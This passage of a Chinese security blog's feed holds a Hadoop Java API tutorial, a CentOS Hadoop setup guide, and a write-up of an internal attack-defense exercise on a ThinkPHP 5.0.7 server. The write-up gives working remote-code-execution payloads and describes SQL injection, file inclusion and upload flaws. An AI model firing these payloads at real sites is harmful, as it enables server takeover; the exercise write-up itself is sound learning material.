class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">package hadoop;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">import</span> org.apache.hadoop.conf.Configuration;</span><br><span class="line">        <span class="keyword">import</span> org.apache.hadoop.fs.FSDataInputStream;</span><br><span class="line">        <span class="keyword">import</span> org.apache.hadoop.fs.FSDataOutputStream;</span><br><span class="line">        <span class="keyword">import</span> org.apache.hadoop.fs.<span class="built_in">FileSystem</span>;</span><br><span class="line">        <span class="keyword">import</span> org.apache.hadoop.fs.Path;</span><br><span class="line">        <span class="keyword">import</span> org.apache.hadoop.io.IOUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> class hadoop&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(<span class="keyword">String</span>[] args)&#123;</span><br><span class="line">        <span class="built_in">try</span>&#123;</span><br><span class="line">            <span class="keyword">String</span> filename = <span class="string">"hdfs://192.168.111.141:9000/user/input/boogle.txt"</span>;</span><br><span class="line">            Configuration configuration = <span class="keyword">new</span> Configuration();</span><br><span class="line">            <span class="built_in">FileSystem</span> fileSystem = <span class="built_in">FileSystem</span>.<span class="built_in">get</span>(configuration);</span><br><span class="line">            <span class="built_in">if</span>(fileSystem.<span class="built_in">exists</span>(<span class="keyword">new</span> Path(filename)))</span><br><span class="line">            &#123;</span><br><span class="line">                System.out.<span class="built_in">println</span>(<span class="string">"文件存在"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">else</span>&#123;</span><br><span class="line">                System.out.<span class="built_in">println</span>(<span class="string">"文件不存在"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            Path inFile = <span class="keyword">new</span> Path(<span class="string">"/user/input/boogle.txt"</span>);</span><br><span class="line">            FSDataOutputStream os = fileSystem.create(inFile);</span><br><span class="line">            os.writeUTF(<span class="string">"Chinese Hadoop Community"</span>);</span><br><span class="line">            os.<span class="built_in">flush</span>();</span><br><span class="line">            os.<span class="built_in">close</span>();</span><br><span class="line">            FSDataInputStream is = fileSystem.<span class="built_in">open</span>(inFile);</span><br><span class="line">            IOUtils.copyBytes(is,System.out,<span class="number">1024</span>,true);</span><br><span class="line">        &#125;<span class="built_in">catch</span> (Exception e)</span><br><span class="line">        &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>按照自己环境修改一下上面的代码。</p><p>之前本地搭建的时候连接hdfs用的localhost，此处远程连接需换成ip。<br>如我的core-site.xml<br><img src="https://i.loli.net/2019/03/29/5c9e1e89e6e02.png" alt></p><p>查看运行结果<br><img src="https://i.loli.net/2019/03/29/5c9e1ec5aaa5f.png" alt></p><h3 id="详细代码"><a href="#详细代码" class="headerlink" title="详细代码"></a>详细代码</h3><p>常用hdfs java api已封装好，直接在main函数中调用即可。<br><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hadoop;</span><br><span class="line">        <span class="keyword">import</span> java.io.IOException;</span><br><span class="line">        <span class="keyword">import</span> java.net.URI;</span><br><span class="line">        <span class="keyword">import</span> java.net.URISyntaxException;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">import</span> org.apache.hadoop.conf.Configuration;</span><br><span class="line">        <span class="keyword">import</span> org.apache.hadoop.fs.FSDataInputStream;</span><br><span class="line">        <span class="keyword">import</span> org.apache.hadoop.fs.FSDataOutputStream;</span><br><span class="line">        <span class="keyword">import</span> org.apache.hadoop.fs.FileSystem;</span><br><span class="line">        <span class="keyword">import</span> org.apache.hadoop.fs.Path;</span><br><span class="line">        <span class="keyword">import</span> org.apache.hadoop.io.IOUtils;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">import</span> org.apache.hadoop.fs.FileStatus;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> class Hdfs &#123;</span><br><span class="line">    <span class="keyword">static</span> Configuration conf = <span class="keyword">new</span> Configuration();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> FileSystem hdfs;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> init()&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        hdfs = FileSystem.<span class="built_in">get</span>(conf);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span>(</span><br><span class="line">    IOException e)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(<span class="keyword">String</span>[] args)&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">             listFiles(<span class="string">"/user"</span>);</span><br><span class="line">             createDir(<span class="string">"/user/input"</span>);</span><br><span class="line">             createFile(<span class="string">"/user/input/test1.txt"</span>,<span class="string">"HelloWoRLd ,It is 2019"</span>);</span><br><span class="line">             createFile(<span class="string">"/user/input/test2.txt"</span>,<span class="string">"hello boogle ,Your Site Is :zhengbao,wang"</span>);</span><br><span class="line">             listFiles(<span class="string">"/user/input"</span>);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> createDir(<span class="keyword">String</span> dir) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        init();</span><br><span class="line">        <span class="comment">//System.out.println("newdir \t" + conf.get("fs.defaultFS") + dir);</span></span><br><span class="line">        Path path = <span class="keyword">new</span> Path(dir);</span><br><span class="line"></span><br><span class="line">        hdfs.mkdirs(path);</span><br><span class="line">        System.out.<span class="built_in">println</span>(<span class="string">"newdir \t"</span> + conf.<span class="built_in">get</span>(<span class="string">"fs.defaultFS"</span>) + dir);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//copy from local file to HDFS file</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> copyFile(<span class="keyword">String</span> localSrc,<span class="keyword">String</span> hdfsDst) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        init();</span><br><span class="line">        Path src = <span class="keyword">new</span> Path(localSrc);</span><br><span class="line">        Path dst = <span class="keyword">new</span> Path(hdfsDst);</span><br><span class="line">        hdfs.copyFromLocalFile(src, dst);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//list all the files in thecurrent direction</span></span><br><span class="line">        FileStatus files[] = hdfs.listStatus(dst);</span><br><span class="line">        System.out.<span class="built_in">println</span>(<span class="string">"Uploadto \t"</span> + conf.<span class="built_in">get</span>(<span class="string">"fs.defaultFS"</span>) + hdfsDst);</span><br><span class="line">        <span class="keyword">for</span> (FileStatus file : files) &#123;</span><br><span class="line">            System.out.<span class="built_in">println</span>(file.getPath());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//create a new file</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>  <span class="keyword">void</span> createFile(<span class="keyword">String</span> fileName,<span class="keyword">String</span> fileContent) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        init();</span><br><span class="line">        Path dst = <span class="keyword">new</span> Path(fileName);</span><br><span class="line">        <span class="built_in">byte</span>[] bytes =fileContent.getBytes();</span><br><span class="line">        FSDataOutputStream output =hdfs.create(dst);</span><br><span class="line">        output.write(bytes);</span><br><span class="line">        System.out.<span class="built_in">println</span>(<span class="string">"newfile \t"</span> + conf.<span class="built_in">get</span>(<span class="string">"fs.defaultFS"</span>) + fileName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//list all files</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> listFiles(<span class="keyword">String</span> dirName)<span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        init();</span><br><span class="line">        Path f = <span class="keyword">new</span> Path(dirName);</span><br><span class="line">        FileStatus[] status =hdfs.listStatus(f);</span><br><span class="line">        System.out.<span class="built_in">println</span>(dirName +<span class="string">" has all files:"</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i&lt;status.length; i++) &#123;</span><br><span class="line">            System.out.<span class="built_in">println</span>(status[i].getPath().toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> deleteFile(<span class="keyword">String</span> fileName)<span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        init();</span><br><span class="line">        Path f = <span class="keyword">new</span> Path(fileName);</span><br><span class="line">        <span class="built_in">boolean</span> isExists =hdfs.exists(f);</span><br><span class="line">        <span class="keyword">if</span> (isExists) &#123;      <span class="comment">//if exists, delete</span></span><br><span class="line">            <span class="built_in">boolean</span> isDel =hdfs.delete(f,<span class="keyword">true</span>);</span><br><span class="line">            System.out.<span class="built_in">println</span>(fileName+ <span class="string">"  delete? \t"</span> + isDel);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.<span class="built_in">println</span>(fileName+ <span class="string">"  exist? \t"</span> + isExists);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="0x03-问题解决"><a href="#0x03-问题解决" class="headerlink" title="0x03 问题解决"></a>0x03 问题解决</h2><p>因为之前hadoop环境已经搭好，容易出现的问题主要是配置IDEA配置问题和网络连接问题。</p><ul><li>关于配置没有详细讲，但是要按照每一个步骤自己操作为，并无难度，勿丢步骤即可。</li><li>关于网络连接，主要出现的问题在于防火墙禁止连接9000端口 可通过修改hosts或者修改防火墙配置</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;关于hadoop的搭建，可以参考之前的一篇文章&lt;a href=&quot;http://zhengbao.wa
      
    
    </summary>
    
      <category term="环境配置" scheme="https://zhengbao.wang/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    
    
      <category term="hadoop" scheme="https://zhengbao.wang/tags/hadoop/"/>
    
  </entry>
  
  <entry>
    <title>内部AWD攻防对抗web记录</title>
    <link href="https://zhengbao.wang/%E5%86%85%E9%83%A8AWD%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97web%E8%AE%B0%E5%BD%95/"/>
    <id>https://zhengbao.wang/内部AWD攻防对抗web记录/</id>
    <published>2019-03-27T13:45:46.000Z</published>
    <updated>2019-03-29T13:46:16.769Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>团队内部进行了一次awd演练，其中web服务器环境基于<code>thinkphp v5.0.7</code>。包含两个个框架通用漏洞，四个魔改过的漏洞，特此记录一下。<br><img src="https://i.loli.net/2019/03/27/5c9b7915ea87b.png" alt></p><h2 id="0x01-thinkphp5-Request-远程代码执行漏洞"><a href="#0x01-thinkphp5-Request-远程代码执行漏洞" class="headerlink" title="0x01 thinkphp5 Request 远程代码执行漏洞"></a>0x01 thinkphp5 Request 远程代码执行漏洞</h2><p>该漏洞详情及修复可见本人博客<a href="http://zhengbao.wang/thinkphp5-Request-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">thinkphp5 Request 远程代码执行漏洞分析</a><br>问题出在核心类Request的method方法。由于未对传入的$method进行限制，导致可以对本类任意方法进行调用且参数可控。<br>payload<br><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//post</span></span><br><span class="line">_method=__construct&amp;<span class="function"><span class="keyword">method</span>=<span class="title">get</span>&amp;<span class="title">filter</span>=<span class="title">system</span>&amp;<span class="title">boo</span>=<span class="title">whoami</span></span></span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/03/27/5c9b7bc2c5ed1.png" alt></p><h2 id="0x02-thinkphp5-x-远程代码执行漏洞"><a href="#0x02-thinkphp5-x-远程代码执行漏洞" class="headerlink" title="0x02 thinkphp5.x 远程代码执行漏洞"></a>0x02 thinkphp5.x 远程代码执行漏洞</h2><p>该漏洞详情及修复可见本人博客<a href="http://zhengbao.wang/thinkphp5-x-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">thinkphp5.x 远程代码执行漏洞</a><br>漏洞的成因是因为在没有开启强制路由的情况下控制器没过滤所引起的远程代码执行漏洞<br>payload<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=index/\think\app/invokefunction&amp;<span class="function"><span class="keyword">function</span>=<span class="title">call_user_func_array</span>&amp;<span class="title">vars</span><span class="params">[0]</span>=<span class="title">system</span>&amp;<span class="title">vars</span><span class="params">[1]</span></span></span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/03/27/5c9b7d596ef65.png" alt></p><h2 id="0x03-thinkphp-缓存函数设计缺陷-getshell"><a href="#0x03-thinkphp-缓存函数设计缺陷-getshell" class="headerlink" title="0x03 thinkphp 缓存函数设计缺陷 getshell"></a>0x03 thinkphp 缓存函数设计缺陷 getshell</h2><p>该漏洞详情及修复可见本人博客<a href="http://zhengbao.wang/thinkphp-%E7%BC%93%E5%AD%98%E5%87%BD%E6%95%B0%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7-getshell/">thinkphp 缓存函数设计缺陷 getshell</a></p><p>漏洞成因是因为thinkphp缓存函数未对其缓存内容进行过滤就直接写入缓存文件。该漏洞利用需要能够控制缓存内容并且猜解缓存文件。这里靶场环境给出了这些很好的条件。</p><p>首先漏洞出现在后台网站配置，可以使用弱口令<code>admin admin</code>登陆。<br><img src="https://i.loli.net/2019/03/27/5c9b804aaedb3.png" alt><br>配置后调用save方法保存配置内容，其内容未经过过滤保存到数据库。<br><img src="https://i.loli.net/2019/03/27/5c9b80b973e58.png" alt><br>当页面再次载入会进入缓存函数，将提交的内容直接进行缓存。<br><img src="https://i.loli.net/2019/03/27/5c9b81d947d89.png" alt><br>这里很贴心的是直接将缓存目录输出了，不需要进行猜测了。<br><img src="https://i.loli.net/2019/03/27/5c9b825a9cc98.png" alt></p><h2 id="0x04-sql注入漏洞"><a href="#0x04-sql注入漏洞" class="headerlink" title="0x04 sql注入漏洞"></a>0x04 sql注入漏洞</h2><p>问题出现再在index.php/index/index/shipinok<br>这里直接将获取的ip带入sql查询<br><img src="https://i.loli.net/2019/03/27/5c9b831202579.png" alt><br>跟进getIP()函数，发现未对ip进新过滤。<br><img src="https://i.loli.net/2019/03/27/5c9b83d20078d.png" alt><br>直接构造<code>X-Forwarded-For</code><br><img src="https://i.loli.net/2019/03/27/5c9b8446dfd46.png" alt></p><h2 id="0x05-任意文件包含"><a href="#0x05-任意文件包含" class="headerlink" title="0x05 任意文件包含"></a>0x05 任意文件包含</h2><p>在推广处直接通过post方式获取内容进行了包含<br><img src="https://i.loli.net/2019/03/27/5c9b853320d1e.png" alt></p><p><img src="https://i.loli.net/2019/03/27/5c9b857531665.png" alt></p><h2 id="0x06-任意文件上传"><a href="#0x06-任意文件上传" class="headerlink" title="0x06 任意文件上传"></a>0x06 任意文件上传</h2><p>该漏洞对thinkphp file类进行了魔改，使上传文件验证规则为空，造成任意文件上传。<br><img src="https://i.loli.net/2019/03/28/5c9c356262f55.png" alt><br>文件名为MD5(filename+’x’)<br><img src="https://i.loli.net/2019/03/28/5c9c36044153d.png" alt><br>在多处上传中均存在该问题。<br><img src="https://i.loli.net/2019/03/28/5c9c366f99e04.png" alt><br>这里以代理后台头像上传为例<br><img src="https://i.loli.net/2019/03/28/5c9c351108a5e.png" alt><br>然后得到文件保存位置即可。<br><img src="https://i.loli.net/2019/03/28/5c9c374def3ae.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;团队内部进行了一次awd演练，其中web服务器环境基于&lt;code&gt;thinkphp v5.0.7&lt;/
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="AWD" scheme="https://zhengbao.wang/tags/AWD/"/>
    
  </entry>
  
  <entry>
    <title>Centos7搭建Hadoop伪分布式集群详细步骤</title>
    <link href="https://zhengbao.wang/Centos7%E6%90%AD%E5%BB%BAHadoop%E4%BC%AA%E5%88%86%E5%B8%83%E5%BC%8F%E9%9B%86%E7%BE%A4%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4/"/>
    <id>https://zhengbao.wang/Centos7搭建Hadoop伪分布式集群详细步骤/</id>
    <published>2019-03-25T12:50:52.000Z</published>
    <updated>2019-03-27T00:01:34.108Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Apache Hadoop是一款支持数据密集型分布式应用程序并以Apache 2.0许可协议发布的开源软件框架。它支持在商品硬件构建的大型集群上运行的应用程序。此处仅使用一台虚拟机进行hadoop集群搭建，因此称为伪分布式。</p><h2 id="0x01-安装JAVA环境-jdk1-8"><a href="#0x01-安装JAVA环境-jdk1-8" class="headerlink" title="0x01 安装JAVA环境-jdk1.8"></a>0x01 安装JAVA环境-jdk1.8</h2><h3 id="下载安装包"><a href="#下载安装包" class="headerlink" title="下载安装包"></a>下载安装包</h3><p>安装包可根据需要从<a href="https://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html" target="_blank" rel="noopener">官网下载</a><br>也可以在centos中使用<code>wget</code>命令下载，如下图提取下载链接<br><img src="https://i.loli.net/2019/03/25/5c98c2dc297db.png" alt><br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#此链接很有可能失效，如失效请重新提取</span></span><br><span class="line">wget https:<span class="regexp">//</span>download.oracle.com<span class="regexp">/otn-pub/</span>java<span class="regexp">/jdk/</span><span class="number">8</span>u201-b09<span class="regexp">/42970487e3af4f5aa5bca3f542482c60/</span>jdk-<span class="number">8</span>u201-linux-x64.tar.gz?AuthParam=<span class="number">1553514841</span>_9cc3afa073df0a90e3fbb39088a2cde9</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/03/25/5c98c32f5e1cc.png" alt></p><h3 id="新建安装目录并解压"><a href="#新建安装目录并解压" class="headerlink" title="新建安装目录并解压"></a>新建安装目录并解压</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir <span class="regexp">/usr/</span>local<span class="regexp">/java/</span></span><br><span class="line">sudo tar -zxvf jdk-<span class="number">8</span>u171-linux-x64.tar.gz -C <span class="regexp">/usr/</span>local<span class="regexp">/java/</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/03/25/5c98c4c776768.png" alt></p><h3 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 打开配置文件</span></span><br><span class="line">vi ~/.bashrc </span><br><span class="line"><span class="comment"># 添加并保存</span></span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">JAVA_HOME</span>=/usr/local/java/jdk1.8.0_201  #注意此处jdk目录与你解压目录相同</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">JRE_HOME</span>=<span class="variable">$JAVA_HOME</span>/jre</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">CLASSPATH</span>=.:$JAVA_HOME/lib:$JRE_HOME/lib</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">PATH</span>=<span class="variable">$JAVA_HOME</span>/bin:$PATH </span><br><span class="line"><span class="comment"># 使环境变量生效</span></span><br><span class="line">source ~/.bashrc</span><br></pre></td></tr></table></figure><h3 id="测试是否配置成功"><a href="#测试是否配置成功" class="headerlink" title="测试是否配置成功"></a>测试是否配置成功</h3><p>然后可通过<code>java -version</code>查看是否配置成功<br><img src="https://i.loli.net/2019/03/25/5c98c686835ff.png" alt></p><h2 id="0x02-下载Hadoop并配置"><a href="#0x02-下载Hadoop并配置" class="headerlink" title="0x02 下载Hadoop并配置"></a>0x02 下载Hadoop并配置</h2><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>从官网下载:<a href="http://mirrors.shu.edu.cn/apache/hadoop/common/hadoop-3.2.0/hadoop-3.2.0.tar.gz" target="_blank" rel="noopener">http://mirrors.shu.edu.cn/apache/hadoop/common/hadoop-3.2.0/hadoop-3.2.0.tar.gz</a><br><img src="https://i.loli.net/2019/03/25/5c98c7dd053db.png" alt><br>下载后解压到想要放置的目录即可。</p><h3 id="配置环境变量-1"><a href="#配置环境变量-1" class="headerlink" title="配置环境变量"></a>配置环境变量</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 打开配置文件</span></span><br><span class="line">vi ~/.bashrc </span><br><span class="line"><span class="comment"># 添加并保存</span></span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">HADOOP_HOME</span>=/home/wzb/hadoop-3.2.0 #注意此处hadoop目录与你解压目录相同</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">PATH</span>=<span class="variable">$PATH</span>:$HADOOP_HOME/bin:$HADOOP_HOME/sbin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使环境变量生效</span></span><br><span class="line">source ~/.bashrc</span><br></pre></td></tr></table></figure><p>配置hadoop-env.sh中的<code>$JAVA_HOME</code><br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi hadoop<span class="number">-3.2</span><span class="number">.0</span>/etc/hadoop/hadoop-env.sh</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/03/25/5c98c95909893.png" alt></p><h3 id="测试是否配置成功-1"><a href="#测试是否配置成功-1" class="headerlink" title="测试是否配置成功"></a>测试是否配置成功</h3><p><code>hadoop version</code><br><img src="https://i.loli.net/2019/03/25/5c98c9ee38c76.png" alt></p><h2 id="0x03-配置ssh免密登陆"><a href="#0x03-配置ssh免密登陆" class="headerlink" title="0x03 配置ssh免密登陆"></a>0x03 配置ssh免密登陆</h2><p>因为hadoop集群在进行验证时采用ssh公钥登陆，此处配置伪分布式集群，以本地免密登陆为例。</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>centos默认安装了openssh，如未安装，请先进行安装<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum <span class="keyword">install</span> openssh-<span class="keyword">server</span> -y</span><br></pre></td></tr></table></figure></p><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>打开openssh主配置文件<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vi <span class="regexp">/etc/</span>ssh<span class="regexp">/sshd_config</span></span><br></pre></td></tr></table></figure></p><p>需开启并配置的文件如下，其他根据需要可自由配置<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Port</span> <span class="number">22</span></span><br><span class="line"><span class="string">ListenAddress</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line"><span class="string">ListenAddress</span> <span class="string">::</span></span><br><span class="line"><span class="string">PermitRootLogin</span> <span class="literal">no</span></span><br><span class="line"><span class="string">StrictModes</span> <span class="literal">no</span></span><br><span class="line"><span class="string">PubkeyAuthentication</span> <span class="literal">yes</span></span><br><span class="line"><span class="string">AuthorizedKeysFile</span>      <span class="string">.ssh/authorized_keys</span></span><br><span class="line"><span class="string">PasswordAuthentication</span> <span class="literal">yes</span></span><br></pre></td></tr></table></figure></p><p>配置完成后重启服务以使配置生效<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo<span class="built_in"> service </span>sshd restart</span><br></pre></td></tr></table></figure></p><h3 id="生成公钥"><a href="#生成公钥" class="headerlink" title="生成公钥"></a>生成公钥</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -P ''  <span class="comment">#直接回车生成公钥和私钥</span></span><br><span class="line"></span><br><span class="line">cat ~<span class="string">/.ssh/id_rsa.pub</span> &gt;&gt; ~<span class="string">/.ssh/authorized_keys</span> <span class="comment">#将本机的公钥添加进authorized_keys中，这样允许本机通过ssh的形式免密码登录，如配置其他主机免密登陆，请将其他主机公钥配置到`authorized_keys`</span></span><br><span class="line"></span><br><span class="line">sudo chmod 700 ~<span class="string">/.ssh</span> <span class="comment">#配置相应权限</span></span><br><span class="line">sudo chmod 600 ~<span class="string">/.ssh/authorized_keys</span></span><br></pre></td></tr></table></figure><h3 id="测试本地免密登陆"><a 